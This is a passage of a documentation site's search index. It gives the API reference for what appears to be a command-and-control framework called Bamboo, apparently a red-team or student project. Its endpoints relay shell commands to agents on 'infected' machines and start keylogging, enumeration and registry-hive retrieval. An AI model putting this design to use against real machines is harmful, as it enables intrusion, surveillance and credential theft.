called when a Bamboo Client user wants to view all registered users in Bamboo Teamserver using the {command <code>users</code>}. Using the <code>model view_users</code>, Bamboo Teamserver will be able to extract the username and status of the registered users.</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema_5","title":"Request schema","text":"Request body Field Type Description username String Username of user"},{"location":"Teamserver_API_Reference/handler_func.html#request-example_5","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema_5","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"user_data\": user_data} Successfully retrieved all registered user information <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"Teamserver_API_Reference/handler_func.html#response-example_5","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"user_data\": &lt;list of usernames and status&gt;\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#add-new-users","title":"Add new Users","text":"<p>Resgiter new users into the Bamboo Teamserver</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint_6","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/register_user\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description_6","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to register a new user into Bamboo Teamserver using the {command <code>register</code>}. Using the <code>model find_one</code>, Bamboo Teamserver will be able to determine if there will be any duplicates of username. After that, it will use the <code>model register_user</code> to add the information of the new user into the database.</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema_6","title":"Request schema","text":"Request body Field Type Description username String Username of user new_username String New user username new_password String New user password"},{"location":"Teamserver_API_Reference/handler_func.html#request-example_6","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"new_username\": \"bambooUserTwo\",\n    \"new_password\": \"ilovePandas213\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema_6","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully registered a new user <code>404</code> {\"status\": \"fail\"} Invalid Body <code>422</code> {\"status\": \"duplicate\"} Username already exist <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"Teamserver_API_Reference/handler_func.html#response-example_6","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#remove-users","title":"Remove Users","text":"<p>Remove Bamboo Client users from Bamboo Teamserver</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint_7","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/delete_user\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description_7","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to remove a user from Bamboo Teamserver using the {command <code>remove [username]</code>}. Using the <code>model delete_user</code>, Bamboo Teamserver will be able to delete the specified user.</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema_7","title":"Request schema","text":"Request body Field Type Description username String Username of user del_username String Username to remove"},{"location":"Teamserver_API_Reference/handler_func.html#request-example_7","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"del_username\": \"bambooUserTwo\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema_7","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully deleted information of specified username <code>404</code> {\"status\": \"fail\"} Username not found <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"Teamserver_API_Reference/handler_func.html#response-example_7","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#command-prompt","title":"Command Prompt","text":"<p>Sends commands to Bamboo Agent</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint_8","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/cmd\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description_8","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to start a shell session with a Bamboo Agent using the {command <code>cmd</code>}. Bamboo Teamserver will use WebSocket to broadcast the command to the specified Bamboo Agent.</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema_8","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent command String Command to forward to Bamboo Agent"},{"location":"Teamserver_API_Reference/handler_func.html#request-example_8","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"command\": \"whoami\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema_8","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully broadcast command to Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"fail\"} Invalid Body"},{"location":"Teamserver_API_Reference/handler_func.html#response-example_8","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#websocket-schema","title":"WebSocket schema","text":"Websocket body Field Type Description command String cmd cmd String Command that Bamboo Client user input"},{"location":"Teamserver_API_Reference/handler_func.html#websocket-example","title":"WebSocket example","text":"Text Only<pre><code>{\n    \"command\": \"cmd\",\n    \"cmd\": \"whoami\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#command-output","title":"Command Output","text":"<p>Receives reponse from Bamboo Agent during command</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint_9","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler_output\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description_9","title":"Description","text":"<p>After the Bamboo Client sends a command over to a Bamboo Agent using the {command <code>cmd</code>}, the Bamboo Client will request for this endpoint and wait for a response. To prevent users for waiting indefinitely, there is a timeout mechanism. Every 10 second, Bamboo Teamserver will check if the command response have been sent every second. If none have been sent, the user will get timeout.</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema_9","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver_API_Reference/handler_func.html#request-example_9","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema_9","title":"Response schema","text":"Status Code Schema Description <code>200</code> {agent_identifier: response} Receive response <code>404</code> {\"status\": \"fail\"} Invalid Body <code>408</code> {\"status\": \"timeout\"} User timeout"},{"location":"Teamserver_API_Reference/handler_func.html#response-example_9","title":"Response example","text":"Text Only<pre><code>{\n    \"5zrire9a\": \"bambooMachine\\panda\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#teamchat","title":"Teamchat","text":"<p>Broadcast teamchat message to all other Bamboo Client</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint_10","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/teamchat\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description_10","title":"Description","text":"<p>This endpoint is called everytime a Bamboo Client user sends a message in the Teamchat using the {command <code>chat</code>} in CLI or using the <code>TEAMCHAT tab</code> in GUI. Bamboo Teamserver will relay the message from the Bamboo Client to all Bamboo Client using WebSocket broadcast.</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema_10","title":"Request schema","text":"Request body Field Type Description username String Username of user message String Message sent into teamchat"},{"location":"Teamserver_API_Reference/handler_func.html#request-example_10","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"message\": \"hello everyone\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema_10","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully broadcast command to Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"fail\"} Invalid Body"},{"location":"Teamserver_API_Reference/handler_func.html#response-example_10","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#websocket-schema_1","title":"WebSocket schema","text":"Websocket body Field Type Description chatMsg String Bamboo Client Message"},{"location":"Teamserver_API_Reference/handler_func.html#websocket-example_1","title":"WebSocket example","text":"Text Only<pre><code>{\n    \"chatMsg\": \"hello everyone\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/overview.html","title":"Overview","text":""},{"location":"Teamserver_API_Reference/overview.html#introduction","title":"Introduction","text":"<p>This section documents the Teamserver's endpoints. One of the main forms of communication that the Teamserver uses is Hypertext Transfer Protocol Secure (HTTPS). By using flask, blueprint, and flask_jwt_extended library for Secure Sockets Layer (SSL) and JSON Web Token (JWT), this ensures that all data exchanged between clients and the server is encrypted and secure, protecting sensitive information from unauthorized access. </p> <p>Flask Blueprint allows related APIs to be grouped together in the same file, under a common prefix. Flask flask_jwt_extended on the other hand provides an easy and secure way to handle JSON Web Tokens (JWTs) for authentication and authorization.</p>"},{"location":"Teamserver_API_Reference/overview.html#base-url","title":"Base URL","text":"<p>Text Only<pre><code>https://[teamserver_ip]:[port]\n</code></pre> For example, if your teamserver is hosted locally on port 4000, your base URL would be</p> Text Only<pre><code>https://127.0.0.1:4000\n</code></pre>"},{"location":"Teamserver_API_Reference/overview.html#list-of-endpoints","title":"List of Endpoints","text":"<p>The table below shows the list of all RESTful APIs in Bamboo Teamserver, which can be found in /teamserver/api.</p> Endpoint Description POST /agent/heartbeat For agent to ping at regular intervals to indicate that it is alive POST /agent/initial_connection/register For agent to register initial connection POST /agent/agent_response For agent to send back the response of a command POST /download/&lt;filename&gt; For agent to download a file from server GET /auth/ For clients to check if server is online POST /auth/login For user to log in to the server POST /auth/logout For user to log out of server POST /auth/check_agent_status To check an agent\u2019s status (dead, alive) POST /exploit/quit For user to exit the [exploit] command POST /exploit/send_config For user to send configurations for an exploit when using the [exploit] command POST /exploit/view_all For user to view all exploits in the database using the [exp] command POST /exploit/add For user to add exploits using the [add] command POST /exploit/delete For user to delete exploits using the [delete] command POST /exploit/exist To check if exploit exists POST /exploit/modify For user to modify an existing exploit in the database POST /handler_func/agent/display For user to view all agents using the [display] command POST /handler_func/use_agent For user to use an agent POST /handler_func/stop_agent For user to stop using an agent POST /handler_func/remove_agent For user to remove an agent from database POST /handler_func/handler/info_status For user to check the status of an agent POST /handler_func/handler/view_users For user to view all users in database POST /handler_func/handler/register_user For user to register a new user POST /handler_func/handler/delete_user For user to delete a user POST /handler_func/cmd For user to send commands to an agent to run in the target\u2019s terminal POST /handler_func/handler_output For user to print the response of a command from the agent POST /handler_func/teamchat For user to send a message to teamchat <p>There are a total of 5 prefixes used in Bamboo Teamserver with the flask blueprint library for all HTTPS APIs. All of the prefixes are organised together as they are for easier management.</p> Prefix Description Examples /auth For authentication and status related /login, /check_agent_status /agent Only for Bamboo Agent to request /heartbeat, /post_exploit/keylog /handler_func For Bamboo Client to request, does not involve Bamboo Agent /agent/display, /handler/delete_user /exploit For exploit related /send_config, /delete /postexp For post exploit related /keylog, /retrieve"},{"location":"Teamserver_API_Reference/postexp.html","title":"/postexp","text":""},{"location":"Teamserver_API_Reference/postexp.html#keylogging","title":"Keylogging","text":"<p>Start/Stop keylogging activity of specified Bamboo Agent</p>"},{"location":"Teamserver_API_Reference/postexp.html#endpoint","title":"Endpoint","text":"Text Only<pre><code>POST /postexp/keylog\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#description","title":"Description","text":"<p>Bamboo Client calls this endpoint when they want to start/stop keylogging activity. All activities will be recorded down into a <code>global variable: keylog_status</code>. keylog_status is a dictionary that keeps track of all keylog activity within Bamboo Teamserver. Therefore, with this global variable, Bamboo Teamserver will be able to tell if the Bamboo Client user is starting or stopping the keylogging. After Bamboo Teamserver know the action to command, a WebSocket broadcast will be made to the Bamboo Agent Specified. This command can be called by any Bamboo Agent with any privilege level.</p>"},{"location":"Teamserver_API_Reference/postexp.html#request-schema","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent method String Tool used (keylog)"},{"location":"Teamserver_API_Reference/postexp.html#request-example","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"method\": \"keylog\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"action\": status} Successfully command Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver_API_Reference/postexp.html#response-example","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"action\": \"start\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#websocket-schema","title":"WebSocket schema","text":"Websocket body Field Type Description command String post exploit method String Keylogging handler String User that commanded status String To start/stop keylogging"},{"location":"Teamserver_API_Reference/postexp.html#websocket-example","title":"WebSocket example","text":"Text Only<pre><code>{\n    \"command\": \"post exploit\",\n    \"method\": \"keylog\",\n    \"handler\": \"bambooUser\",\n    \"status\": \"start\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#enumeration","title":"Enumeration","text":"<p>Start enumerating an infected machine</p>"},{"location":"Teamserver_API_Reference/postexp.html#endpoint_1","title":"Endpoint","text":"Text Only<pre><code>POST /postexp/enum\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#description_1","title":"Description","text":"<p>Bamboo Client calls this endpoint when they want to enumerate the infected machine remotely using the specified Bamboo Agent. Bamboo teamserver will send a WebSocket broadcast to the Bamboo Agent specified and command it to start enumerate the infected machine. This command can be called by any Bamboo Agent with any privilege level.</p>"},{"location":"Teamserver_API_Reference/postexp.html#request-schema_1","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent method String Tool used (enumerate)"},{"location":"Teamserver_API_Reference/postexp.html#request-example_1","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"method\": \"enum\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully command Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver_API_Reference/postexp.html#response-example_1","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#websocket-schema_1","title":"WebSocket schema","text":"Websocket body Field Type Description command String post exploit method String Keylogging handler String User that commanded"},{"location":"Teamserver_API_Reference/postexp.html#websocket-example_1","title":"WebSocket example","text":"Text Only<pre><code>{\n    \"command\": \"post exploit\",\n    \"method\": \"enumerate\",\n    \"handler\": \"bambooUser\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#sss_retrieve","title":"SSS_Retrieve","text":"<p>Retrieve registry hive of infected machine</p>"},{"location":"Teamserver_API_Reference/postexp.html#endpoint_2","title":"Endpoint","text":"Text Only<pre><code>POST /postexp/reteive\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#description_2","title":"Description","text":"<p>Bamboo Client calls this endpoint when they want to retrieve the registry hive of the infected machine remotely using the specified Bamboo Agent. This command can only be called by Bamboo Agent with <code>High</code> or <code>System</code> level privilege. If the requirements are met, Bamboo teamserver will send a WebSocket broadcast to the Bamboo Agent specified and command it to start retrieving the registry hive of the infected machine.</p>"},{"location":"Teamserver_API_Reference/postexp.html#request-schema_2","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent method String Tool used (enumerate) priv_lvl String Privilege level of Bamboo Agent"},{"location":"Teamserver_API_Reference/postexp.html#request-example_2","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"method\": \"enum\",\n    \"priv_lvl\": \"System\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully command Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver_API_Reference/postexp.html#response-example_2","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/postexp.html#websocket-schema_2","title":"WebSocket schema","text":"Websocket body Field Type Description command String post exploit method String Keylogging handler String User that commanded"},{"location":"Teamserver_API_Reference/postexp.html#websocket-example_2","title":"WebSocket example","text":"Text Only<pre><code>{\n    \"command\": \"post exploit\",\n    \"method\": \"sss retrieve\",\n    \"handler\": \"bambooUser\"\n}\n</code></pre>"}]}